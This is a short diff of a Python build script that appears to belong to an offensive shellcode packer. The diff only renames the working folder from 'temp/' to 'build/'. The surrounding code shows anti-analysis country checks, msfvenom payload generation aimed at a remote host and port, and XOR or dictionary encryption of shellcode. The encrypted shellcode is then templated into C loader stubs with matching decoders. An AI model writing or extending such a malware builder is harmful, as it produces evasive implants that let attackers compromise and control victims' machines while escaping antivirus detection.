@@ -35,7 +35,7 @@ AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
 if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
     AVOID_COUNTRIES = []
 
-WORKING_FOLDER = "temp/"
+WORKING_FOLDER = "build/"
 
 
 def main():
@@ -68,7 +68,7 @@ def main():
                     dword_value = random.randint(0, 0xFFFFFFF)
                     sed_file(WORKING_FOLDER+PAYLOAD_NAME, tag, hex(dword_value))
             instructions = nasm2instructions(WORKING_FOLDER+PAYLOAD_NAME)
-            with open("temp/payload.txt", "w") as f:
+            with open("build/payload.txt", "w") as f:
                 f.write(str(instructions))
         else:
             msfvenom(PAYLOAD_NAME, RHOST, RPORT, RURI)
@@ -178,8 +178,8 @@ def main():
         print(f"\nEncrypted with dictionary\n")
         instructions, association_table, size_payload_phrase = dictionary_encrypt(instructions)
 
-        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
-        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
+        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(round_pow2(size_payload_phrase)))
+        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[];\n\n{association_table}\n\nconst char* dict_payload = {instructions};")
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "DICT_decrypt(dict_payload);")
     
     else:
@@ -188,8 +188,8 @@ def main():
         encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
         print(encrypted_instructions[:32]+"...")
 
-        sed_file("temp/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
-        sed_file("temp/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
+        sed_file("build/definitions.h", "%PAYLOAD_SIZE%", str(int(len(instructions)/2)))
+        sed_file("build/payload.c", "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
         sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
     
     print("===================================\n")
